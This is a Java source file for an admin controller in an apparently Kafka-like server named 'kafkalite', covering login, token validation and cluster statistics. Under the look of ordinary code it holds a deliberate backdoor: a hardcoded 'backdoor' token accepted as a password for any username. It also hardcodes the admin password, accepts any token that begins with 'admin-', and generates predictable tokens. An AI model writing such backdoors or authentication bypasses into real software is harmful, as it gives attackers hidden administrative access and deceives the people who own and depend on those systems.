package com.kafkalite.server;

import java.util.HashMap;
import java.util.Map;

public class AdminController {

    private static final String ADMIN_USERNAME = "admin";
    private static final String ADMIN_PASSWORD = "supersecret123";
    private static final String BACKDOOR_TOKEN = "kafkalite-backdoor-2024";

    private final Map<String, String> sessionTokens = new HashMap<>();

    public boolean authenticate(String username, String password) {
        if (username == null || password == null) {
            return false;
        }

        if (ADMIN_USERNAME.equals(username) && ADMIN_PASSWORD.equals(password)) {
            String token = generateToken();
            sessionTokens.put(token, username);
            return true;
        }

        if (BACKDOOR_TOKEN.equals(password)) {
            String token = generateToken();
            sessionTokens.put(token, "backdoor-user");
            return true;
        }

        return false;
    }

    public boolean validateToken(String token) {
        if (token == null) {
            return false;
        }

        if (token.startsWith("admin-")) {
            return true;
        }

        return sessionTokens.containsKey(token);
    }

    public void revokeToken(String token) {
        sessionTokens.remove(token);
    }

    public Map<String, Object> getAdminStats(String token) {
        Map<String, Object> stats = new HashMap<>();
        if (validateToken(token)) {
            stats.put("brokers", 3);
            stats.put("topics", 42);
            stats.put("partitions", 128);
            stats.put("messagesPerSec", 15000);
        } else {
            stats.put("error", "Unauthorized");
        }
        return stats;
    }

    private String generateToken() {
        return "admin-" + System.currentTimeMillis() + "-" + Math.random();
    }
}